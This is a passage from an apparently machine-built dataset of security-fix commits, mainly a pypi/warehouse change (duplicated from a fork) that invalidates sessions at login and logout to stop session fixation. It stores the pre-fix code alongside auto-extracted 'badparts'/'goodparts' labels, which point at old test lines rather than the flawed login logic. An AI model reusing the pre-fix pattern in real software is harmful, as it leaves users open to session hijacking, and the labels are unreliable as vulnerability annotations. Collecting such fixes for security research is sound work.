MAIL_SERVER = os.environ.get('MAIL_SERVER')\n    MAIL_PORT = os.environ.get('MAIL_PORT')\n    MAIL_USE_TLS = os.environ.get('MAIL_USE_TLS', \"True\") == \"True\"\n    MAIL_USERNAME = os.environ.get('MAIL_USERNAME')\n    MAIL_PASSWORD = os.environ.get('MAIL_PASSWORD')\n    MAIL_SUBJECT_PREFIX = os.environ.get('SUBJECT_PREFIX')\n    MAIL_SENDER = os.environ.get('MAIL_SENDER')\n\n    # TODO: should be a constant\n    EMAIL_TEMPLATE_DIR = 'email_templates\/'\n\n    # Flask-SQLAlchemy\n    SQLALCHEMY_TRACK_MODIFICATIONS = False  # remove once this becomes the default\n\n    # Upload Settings\n    # TODO: change naming since quarantine is used as a serving directory as well\n    UPLOAD_QUARANTINE_DIRECTORY = (os.environ.get('UPLOAD_QUARANTINE_DIRECTORY') or\n                                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/incoming\/'))\n    UPLOAD_SERVING_DIRECTORY = (os.environ.get('UPLOAD_DIRECTORY') or\n                                os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/outgoing\/'))\n    UPLOAD_DIRECTORY = (os.environ.get('UPLOAD_DIRECTORY') or\n                        os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/')\n                        if not USE_SFTP else SFTP_UPLOAD_DIRECTORY)\n    VIRUS_SCAN_ENABLED = os.environ.get('VIRUS_SCAN_ENABLED') == \"True\"\n    MAGIC_FILE = (os.environ.get('MAGIC_FILE') or\n                  os.path.join(os.path.abspath(os.path.dirname(__file__)), 'magic'))\n\n    # ReCaptcha\n    RECAPTCHA_SITE_KEY = os.environ.get('RECAPTCHA_SITE_KEY')\n    RECAPTCHA_SECRET_KEY = os.environ.get('RECAPTCHA_SECRET_KEY')\n\n    # ElasticSearch settings\n    ELASTICSEARCH_HOST = os.environ.get('ELASTICSEARCH_HOST') or \"localhost:9200\"\n    ELASTICSEARCH_ENABLED = os.environ.get('ELASTICSEARCH_ENABLED') == \"True\"\n    ELASTICSEARCH_INDEX = os.environ.get('ELASTICSEARCH_INDEX') or \"requests\"\n    ELASTICSEARCH_USE_SSL = os.environ.get('ELASTICSEARCH_USE_SSL') == \"True\"\n    ELASTICSEARCH_USERNAME = os.environ.get('ELASTICSEARCH_USERNAME')\n    ELASTICSEARCH_PASSWORD = os.environ.get('ELASTICSEARCH_PASSWORD')\n    ELASTICSEARCH_HTTP_AUTH = ((ELASTICSEARCH_USERNAME,\n                                ELASTICSEARCH_PASSWORD)\n                               if ELASTICSEARCH_USERNAME and ELASTICSEARCH_PASSWORD\n                               else None)\n    # https:\/\/www.elastic.co\/blog\/index-vs-type\n\n    @staticmethod\n    def init_app(app):\n        pass\n\n\nclass DevelopmentConfig(Config):\n    DEBUG = True\n    VIRUS_SCAN_ENABLED = os.environ.get('VIRUS_SCAN_ENABLED') == \"True\"\n    MAIL_SERVER = os.environ.get('MAIL_SERVER') or 'localhost'\n    MAIL_PORT = os.environ.get('MAIL_PORT') or 2500\n    MAIL_USE_TLS = False\n    MAIL_SUBJECT_PREFIX = '[OpenRecords Development]'\n    MAIL_SENDER = 'OpenRecords - Dev Admin <donotreply@records.nyc.gov>'\n    SQLALCHEMY_DATABASE_URI = (os.environ.get('DATABASE_URL') or\n                               'postgresql:\/\/localhost:5432\/openrecords_v2_0_dev')\n    # Using Vagrant? Try: 'postgresql:\/\/vagrant@\/openrecords_v2_0_dev'\n    ELASTICSEARCH_INDEX = os.environ.get('ELASTICSEARCH_INDEX') or \"requests_dev\"\n    MAGIC_FILE = os.environ.get('MAGIC_FILE')\n\n\nclass TestingConfig(Config):\n    TESTING = True\n    VIRUS_SCAN_ENABLED = True\n    USE_SFTP = False\n    UPLOAD_DIRECTORY = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/')\n    MAIL_SUBJECT_PREFIX = '[OpenRecords Testing]'\n    MAIL_SENDER = 'OpenRecords - Testing Admin <donotreply@records.nyc.gov>'\n    SQLALCHEMY_DATABASE_URI = (os.environ.get('TEST_DATABASE_URL') or\n                               'postgresql:\/\/localhost:5432\/openrecords_v2_0_test')\n\n\nclass ProductionConfig(Config):\n    # TODO: complete me\n    VIRUS_SCAN_ENABLED = True\n    ELASTICSEARCH_ENABLED = True\n\n\nconfig = {\n    'development': DevelopmentConfig,\n    'testing': TestingConfig,\n    'production': ProductionConfig,\n    'default': DevelopmentConfig\n}\n"}},"msg":"prevent session fixation attacks"}},"https:\/\/github.com\/pypi\/warehouse":{"6c7ebab691bcec56724e8b3d82583514f06be79d":{"url":"https:\/\/api.github.com\/repos\/pypi\/warehouse\/commits\/6c7ebab691bcec56724e8b3d82583514f06be79d","html_url":"https:\/\/github.com\/pypi\/warehouse\/commit\/6c7ebab691bcec56724e8b3d82583514f06be79d","sha":"6c7ebab691bcec56724e8b3d82583514f06be79d","keyword":"session fixation protect","diff":"diff --git a\/tests\/accounts\/test_views.py b\/tests\/accounts\/test_views.py\nindex 1721d767cd5..457e1e9236c 100644\n--- a\/tests\/accounts\/test_views.py\n+++ b\/tests\/accounts\/test_views.py\n@@ -95,17 +95,29 @@ def test_post_invalid_returns_form(self, pyramid_request):\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n@@ -128,6 +140,11 @@ def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n             ),\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n+        if with_user:\n+            assert new_session == {}\n+        else:\n+            assert new_session == {\"a\": \"b\", \"foo\": \"bar\"}\n+        assert pyramid_request.session.invalidate.calls == [pretend.call()]\n         assert remember.calls == [pretend.call(pyramid_request, 1)]\n         assert pyramid_request.session.new_csrf_token.calls == [pretend.call()]\n         assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n@@ -143,10 +160,14 @@ def test_post_forgets_user(self, monkeypatch, pyramid_request):\n         monkeypatch.setattr(views, \"forget\", forget)\n \n         pyramid_request.method = \"POST\"\n+        pyramid_request.session = pretend.stub(\n+            invalidate=pretend.call_recorder(lambda: None),\n+        )\n \n         result = views.logout(pyramid_request)\n \n         assert isinstance(result, HTTPSeeOther)\n         assert result.headers[\"Location\"] == \"\/\"\n         assert forget.calls == [pretend.call(pyramid_request)]\n+        assert pyramid_request.session.invalidate.calls == [pretend.call()]\n         assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\ndiff --git a\/warehouse\/accounts\/views.py b\/warehouse\/accounts\/views.py\nindex ab3c6fa89af..e4911adf3ce 100644\n--- a\/warehouse\/accounts\/views.py\n+++ b\/warehouse\/accounts\/views.py\n@@ -66,6 +66,33 @@ def login(request, _form_class=LoginForm):\n     )\n \n     if request.method == \"POST\" and form.validate():\n+        # We have a session factory associated with this request, so in order\n+        # to protect against session fixation attacks we're going to make sure\n+        # that we create a new session (which for sessions with an identifier\n+        # will cause it to get a new session identifier).\n+\n+        # We need to protect against session fixation attacks, so make sure\n+        # that we create a new session (which will cause it to get a new\n+        # session identifier).\n+        # TODO: This should be removed once\/if Pylons\/pyramid#1570 gets merged\n+        #       to handle this for us.\n+        if (request.unauthenticated_userid is not None\n+                and request.unauthenticated_userid != form.user.id):\n+            # There is already a userid associated with this request and it is\n+            # a different userid than the one we're trying to remember now. In\n+            # this case we want to drop the existing session completely because\n+            # we don't want to leak any data between authenticated userids.\n+            request.session.invalidate()\n+        else:\n+            # We either do not have an associated userid with this request\n+            # already, or the userid is the same one we're trying to remember\n+            # now. In either case we want to keep all of the data but we want\n+            # to make sure that we create a new session since we're crossing\n+            # a privilege boundary.\n+            data = dict(request.session.items())\n+            request.session.invalidate()\n+            request.session.update(data)\n+\n         # Remember the userid using the authentication policy.\n         headers = remember(request, form.user.id)\n         request.response.headerlist.extend(headers)\n@@ -102,6 +129,18 @@ def logout(request):\n         headers = forget(request)\n         request.response.headerlist.extend(headers)\n \n+        # When crossing an authentication boundry we want to create a new\n+        # session identifier. We don't want to keep any information in the\n+        # session when going from authenticated to unauthenticated because\n+        # user's generally expect that logging out is a desctructive action\n+        # that erases all of their private data. However if we don't clear the\n+        # session then another user can use the computer after them, log in to\n+        # their account, and then gain access to anything sensitive stored in\n+        # the session for the original user.\n+        # TODO: This should be removed once\/if Pylons\/pyramid#1570 gets merged\n+        #       to handle this for us.\n+        request.session.invalidate()\n+\n         # Now that we're logged out we'll want to redirect the user to either\n         # where they were originally, or to the default view.\n         # TODO: Implement ?next= support.\n","message":"","files":{"\/tests\/accounts\/test_views.py":{"changes":[{"diff":"\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n","add":14,"remove":2,"filename":"\/tests\/accounts\/test_views.py","badparts":["    def test_post_validate_redirects(self, monkeypatch, pyramid_request):","            new_csrf_token=pretend.call_recorder(lambda: None)"],"goodparts":["    @pytest.mark.parametrize(\"with_user\", [True, False])","    def test_post_validate_redirects(self, monkeypatch, pyramid_request,","                                     with_user):","        new_session = {}","            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],","            update=new_session.update,","            invalidate=pretend.call_recorder(lambda: None),","            new_csrf_token=pretend.call_recorder(lambda: None),","        )","        pyramid_request.set_property(","            lambda r: 1234 if with_user else None,","            name=\"unauthenticated_userid\","]},{"diff":"\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n","add":14,"remove":2,"filename":"\/tests\/accounts\/test_views.py","badparts":["    def test_post_validate_redirects(self, monkeypatch, pyramid_request):","            new_csrf_token=pretend.call_recorder(lambda: None)"],"goodparts":["    @pytest.mark.parametrize(\"with_user\", [True, False])","    def test_post_validate_redirects(self, monkeypatch, pyramid_request,","                                     with_user):","        new_session = {}","            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],","            update=new_session.update,","            invalidate=pretend.call_recorder(lambda: None),","            new_csrf_token=pretend.call_recorder(lambda: None),","        )","        pyramid_request.set_property(","            lambda r: 1234 if with_user else None,","            name=\"unauthenticated_userid\","]}],"source":"\n import pretend import pytest from pyramid.httpexceptions import( HTTPMovedPermanently, HTTPNotFound, HTTPSeeOther, ) from warehouse.accounts import views from..common.db.accounts import UserFactory class TestUserProfile: def test_no_user(self, db_request): with pytest.raises(HTTPNotFound): views.profile(db_request, \"non-existent-user\") def test_user_redirects_username(self, db_request): user=UserFactory.create(session=db_request.db) if user.username.upper() !=user.username: username=user.username.upper() else: username=user.username.lower() db_request.current_route_url=pretend.call_recorder( lambda username: \"\/user\/the-redirect\/\" ) result=views.profile(db_request, username) assert isinstance(result, HTTPMovedPermanently) assert result.headers[\"Location\"]==\"\/user\/the-redirect\/\" assert db_request.current_route_url.calls==[ pretend.call(username=user.username), ] def test_returns_user(self, db_request): user=UserFactory.create(session=db_request.db) assert views.profile(db_request, user.username)=={\"user\": user} class TestLogin: def test_get_returns_form(self, pyramid_request): pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() form_obj=pretend.stub() form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert result=={\"form\": form_obj} assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] def test_post_invalid_returns_form(self, pyramid_request): pyramid_request.method=\"POST\" pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() form_obj=pretend.stub(validate=pretend.call_recorder(lambda: False)) form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert result=={\"form\": form_obj} assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] assert form_obj.validate.calls==[pretend.call()] def test_post_validate_redirects(self, monkeypatch, pyramid_request): remember=pretend.call_recorder( lambda request, user_id:[(\"foo\", \"bar\")] ) monkeypatch.setattr(views, \"remember\", remember) pyramid_request.method=\"POST\" pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() pyramid_request.session=pretend.stub( new_csrf_token=pretend.call_recorder(lambda: None) ) form_obj=pretend.stub( validate=pretend.call_recorder(lambda: True), user=pretend.stub(id=1), ) form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) result=views.login(pyramid_request, _form_class=form_class) assert isinstance(result, HTTPSeeOther) assert result.headers[\"Location\"]==\"\/\" assert form_class.calls==[ pretend.call( pyramid_request.POST, db=pyramid_request.db, password_hasher=pyramid_request.password_hasher, ), ] assert form_obj.validate.calls==[pretend.call()] assert remember.calls==[pretend.call(pyramid_request, 1)] assert pyramid_request.session.new_csrf_token.calls==[pretend.call()] assert(\"foo\", \"bar\") in pyramid_request.response.headerlist class TestLogout: def test_get_returns_empty(self, pyramid_request): assert views.logout(pyramid_request)=={} def test_post_forgets_user(self, monkeypatch, pyramid_request): forget=pretend.call_recorder(lambda request:[(\"foo\", \"bar\")]) monkeypatch.setattr(views, \"forget\", forget) pyramid_request.method=\"POST\" result=views.logout(pyramid_request) assert isinstance(result, HTTPSeeOther) assert result.headers[\"Location\"]==\"\/\" assert forget.calls==[pretend.call(pyramid_request)] assert(\"foo\", \"bar\") in pyramid_request.response.headerlist ","sourceWithComments":"# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport pretend\nimport pytest\n\nfrom pyramid.httpexceptions import (\n    HTTPMovedPermanently, HTTPNotFound, HTTPSeeOther,\n)\n\nfrom warehouse.accounts import views\n\nfrom ..common.db.accounts import UserFactory\n\n\nclass TestUserProfile:\n\n    def test_no_user(self, db_request):\n        with pytest.raises(HTTPNotFound):\n            views.profile(db_request, \"non-existent-user\")\n\n    def test_user_redirects_username(self, db_request):\n        user = UserFactory.create(session=db_request.db)\n\n        if user.username.upper() != user.username:\n            username = user.username.upper()\n        else:\n            username = user.username.lower()\n\n        db_request.current_route_url = pretend.call_recorder(\n            lambda username: \"\/user\/the-redirect\/\"\n        )\n\n        result = views.profile(db_request, username)\n\n        assert isinstance(result, HTTPMovedPermanently)\n        assert result.headers[\"Location\"] == \"\/user\/the-redirect\/\"\n        assert db_request.current_route_url.calls == [\n            pretend.call(username=user.username),\n        ]\n\n    def test_returns_user(self, db_request):\n        user = UserFactory.create(session=db_request.db)\n        assert views.profile(db_request, user.username) == {\"user\": user}\n\n\nclass TestLogin:\n\n    def test_get_returns_form(self, pyramid_request):\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        form_obj = pretend.stub()\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert result == {\"form\": form_obj}\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n\n    def test_post_invalid_returns_form(self, pyramid_request):\n        pyramid_request.method = \"POST\"\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        form_obj = pretend.stub(validate=pretend.call_recorder(lambda: False))\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert result == {\"form\": form_obj}\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n        assert form_obj.validate.calls == [pretend.call()]\n\n    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n        remember = pretend.call_recorder(\n            lambda request, user_id: [(\"foo\", \"bar\")]\n        )\n        monkeypatch.setattr(views, \"remember\", remember)\n\n        pyramid_request.method = \"POST\"\n        pyramid_request.db = pretend.stub()\n        pyramid_request.password_hasher = pretend.stub()\n        pyramid_request.session = pretend.stub(\n            new_csrf_token=pretend.call_recorder(lambda: None)\n        )\n\n        form_obj = pretend.stub(\n            validate=pretend.call_recorder(lambda: True),\n            user=pretend.stub(id=1),\n        )\n        form_class = pretend.call_recorder(\n            lambda d, db, password_hasher: form_obj\n        )\n\n        result = views.login(pyramid_request, _form_class=form_class)\n\n        assert isinstance(result, HTTPSeeOther)\n        assert result.headers[\"Location\"] == \"\/\"\n        assert form_class.calls == [\n            pretend.call(\n                pyramid_request.POST,\n                db=pyramid_request.db,\n                password_hasher=pyramid_request.password_hasher,\n            ),\n        ]\n        assert form_obj.validate.calls == [pretend.call()]\n        assert remember.calls == [pretend.call(pyramid_request, 1)]\n        assert pyramid_request.session.new_csrf_token.calls == [pretend.call()]\n        assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n\n\nclass TestLogout:\n\n    def test_get_returns_empty(self, pyramid_request):\n        assert views.logout(pyramid_request) == {}\n\n    def test_post_forgets_user(self, monkeypatch, pyramid_request):\n        forget = pretend.call_recorder(lambda request: [(\"foo\", \"bar\")])\n        monkeypatch.setattr(views, \"forget\", forget)\n\n        pyramid_request.method = \"POST\"\n\n        result = views.logout(pyramid_request)\n\n        assert isinstance(result, HTTPSeeOther)\n        assert result.headers[\"Location\"] == \"\/\"\n        assert forget.calls == [pretend.call(pyramid_request)]\n        assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n"}},"msg":"Protect against session fixation and session data leakage"}},"https:\/\/github.com\/quicklers\/pypa1":{"6c7ebab691bcec56724e8b3d82583514f06be79d":{"url":"https:\/\/api.github.com\/repos\/quicklers\/pypa1\/commits\/6c7ebab691bcec56724e8b3d82583514f06be79d","html_url":"https:\/\/github.com\/quicklers\/pypa1\/commit\/6c7ebab691bcec56724e8b3d82583514f06be79d","sha":"6c7ebab691bcec56724e8b3d82583514f06be79d","keyword":"session fixation protect","diff":"diff --git a\/tests\/accounts\/test_views.py b\/tests\/accounts\/test_views.py\nindex 1721d767c..457e1e923 100644\n--- a\/tests\/accounts\/test_views.py\n+++ b\/tests\/accounts\/test_views.py\n@@ -95,17 +95,29 @@ def test_post_invalid_returns_form(self, pyramid_request):\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n@@ -128,6 +140,11 @@ def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n             ),\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n+        if with_user:\n+            assert new_session == {}\n+        else:\n+            assert new_session == {\"a\": \"b\", \"foo\": \"bar\"}\n+        assert pyramid_request.session.invalidate.calls == [pretend.call()]\n         assert remember.calls == [pretend.call(pyramid_request, 1)]\n         assert pyramid_request.session.new_csrf_token.calls == [pretend.call()]\n         assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\n@@ -143,10 +160,14 @@ def test_post_forgets_user(self, monkeypatch, pyramid_request):\n         monkeypatch.setattr(views, \"forget\", forget)\n \n         pyramid_request.method = \"POST\"\n+        pyramid_request.session = pretend.stub(\n+            invalidate=pretend.call_recorder(lambda: None),\n+        )\n \n         result = views.logout(pyramid_request)\n \n         assert isinstance(result, HTTPSeeOther)\n         assert result.headers[\"Location\"] == \"\/\"\n         assert forget.calls == [pretend.call(pyramid_request)]\n+        assert pyramid_request.session.invalidate.calls == [pretend.call()]\n         assert (\"foo\", \"bar\") in pyramid_request.response.headerlist\ndiff --git a\/warehouse\/accounts\/views.py b\/warehouse\/accounts\/views.py\nindex ab3c6fa89..e4911adf3 100644\n--- a\/warehouse\/accounts\/views.py\n+++ b\/warehouse\/accounts\/views.py\n@@ -66,6 +66,33 @@ def login(request, _form_class=LoginForm):\n     )\n \n     if request.method == \"POST\" and form.validate():\n+        # We have a session factory associated with this request, so in order\n+        # to protect against session fixation attacks we're going to make sure\n+        # that we create a new session (which for sessions with an identifier\n+        # will cause it to get a new session identifier).\n+\n+        # We need to protect against session fixation attacks, so make sure\n+        # that we create a new session (which will cause it to get a new\n+        # session identifier).\n+        # TODO: This should be removed once\/if Pylons\/pyramid#1570 gets merged\n+        #       to handle this for us.\n+        if (request.unauthenticated_userid is not None\n+                and request.unauthenticated_userid != form.user.id):\n+            # There is already a userid associated with this request and it is\n+            # a different userid than the one we're trying to remember now. In\n+            # this case we want to drop the existing session completely because\n+            # we don't want to leak any data between authenticated userids.\n+            request.session.invalidate()\n+        else:\n+            # We either do not have an associated userid with this request\n+            # already, or the userid is the same one we're trying to remember\n+            # now. In either case we want to keep all of the data but we want\n+            # to make sure that we create a new session since we're crossing\n+            # a privilege boundary.\n+            data = dict(request.session.items())\n+            request.session.invalidate()\n+            request.session.update(data)\n+\n         # Remember the userid using the authentication policy.\n         headers = remember(request, form.user.id)\n         request.response.headerlist.extend(headers)\n@@ -102,6 +129,18 @@ def logout(request):\n         headers = forget(request)\n         request.response.headerlist.extend(headers)\n \n+        # When crossing an authentication boundry we want to create a new\n+        # session identifier. We don't want to keep any information in the\n+        # session when going from authenticated to unauthenticated because\n+        # user's generally expect that logging out is a desctructive action\n+        # that erases all of their private data. However if we don't clear the\n+        # session then another user can use the computer after them, log in to\n+        # their account, and then gain access to anything sensitive stored in\n+        # the session for the original user.\n+        # TODO: This should be removed once\/if Pylons\/pyramid#1570 gets merged\n+        #       to handle this for us.\n+        request.session.invalidate()\n+\n         # Now that we're logged out we'll want to redirect the user to either\n         # where they were originally, or to the default view.\n         # TODO: Implement ?next= support.\n","message":"","files":{"\/tests\/accounts\/test_views.py":{"changes":[{"diff":"\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n","add":14,"remove":2,"filename":"\/tests\/accounts\/test_views.py","badparts":["    def test_post_validate_redirects(self, monkeypatch, pyramid_request):","            new_csrf_token=pretend.call_recorder(lambda: None)"],"goodparts":["    @pytest.mark.parametrize(\"with_user\", [True, False])","    def test_post_validate_redirects(self, monkeypatch, pyramid_request,","                                     with_user):","        new_session = {}","            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],","            update=new_session.update,","            invalidate=pretend.call_recorder(lambda: None),","            new_csrf_token=pretend.call_recorder(lambda: None),","        )","        pyramid_request.set_property(","            lambda r: 1234 if with_user else None,","            name=\"unauthenticated_userid\","]},{"diff":"\n         ]\n         assert form_obj.validate.calls == [pretend.call()]\n \n-    def test_post_validate_redirects(self, monkeypatch, pyramid_request):\n+    @pytest.mark.parametrize(\"with_user\", [True, False])\n+    def test_post_validate_redirects(self, monkeypatch, pyramid_request,\n+                                     with_user):\n         remember = pretend.call_recorder(\n             lambda request, user_id: [(\"foo\", \"bar\")]\n         )\n         monkeypatch.setattr(views, \"remember\", remember)\n \n+        new_session = {}\n+\n         pyramid_request.method = \"POST\"\n         pyramid_request.db = pretend.stub()\n         pyramid_request.password_hasher = pretend.stub()\n         pyramid_request.session = pretend.stub(\n-            new_csrf_token=pretend.call_recorder(lambda: None)\n+            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],\n+            update=new_session.update,\n+            invalidate=pretend.call_recorder(lambda: None),\n+            new_csrf_token=pretend.call_recorder(lambda: None),\n+        )\n+\n+        pyramid_request.set_property(\n+            lambda r: 1234 if with_user else None,\n+            name=\"unauthenticated_userid\",\n         )\n \n         form_obj = pretend.stub(\n","add":14,"remove":2,"filename":"\/tests\/accounts\/test_views.py","badparts":["    def test_post_validate_redirects(self, monkeypatch, pyramid_request):","            new_csrf_token=pretend.call_recorder(lambda: None)"],"goodparts":["    @pytest.mark.parametrize(\"with_user\", [True, False])","    def test_post_validate_redirects(self, monkeypatch, pyramid_request,","                                     with_user):","        new_session = {}","            items=lambda: [(\"a\", \"b\"), (\"foo\", \"bar\")],","            update=new_session.update,","            invalidate=pretend.call_recorder(lambda: None),","            new_csrf_token=pretend.call_recorder(lambda: None),","        )","        pyramid_request.set_property(","            lambda r: 1234 if with_user else None,","            name=\"unauthenticated_userid\","]}],"source":"\n import pretend import pytest from pyramid.httpexceptions import( HTTPMovedPermanently, HTTPNotFound, HTTPSeeOther, ) from warehouse.accounts import views from..common.db.accounts import UserFactory class TestUserProfile: def test_no_user(self, db_request): with pytest.raises(HTTPNotFound): views.profile(db_request, \"non-existent-user\") def test_user_redirects_username(self, db_request): user=UserFactory.create(session=db_request.db) if user.username.upper() !=user.username: username=user.username.upper() else: username=user.username.lower() db_request.current_route_url=pretend.call_recorder( lambda username: \"\/user\/the-redirect\/\" ) result=views.profile(db_request, username) assert isinstance(result, HTTPMovedPermanently) assert result.headers[\"Location\"]==\"\/user\/the-redirect\/\" assert db_request.current_route_url.calls==[ pretend.call(username=user.username), ] def test_returns_user(self, db_request): user=UserFactory.create(session=db_request.db) assert views.profile(db_request, user.username)=={\"user\": user} class TestLogin: def test_get_returns_form(self, pyramid_request): pyramid_request.db=pretend.stub() pyramid_request.password_hasher=pretend.stub() form_obj=pretend.stub() form_class=pretend.call_recorder( lambda d, db, password_hasher: form_obj ) 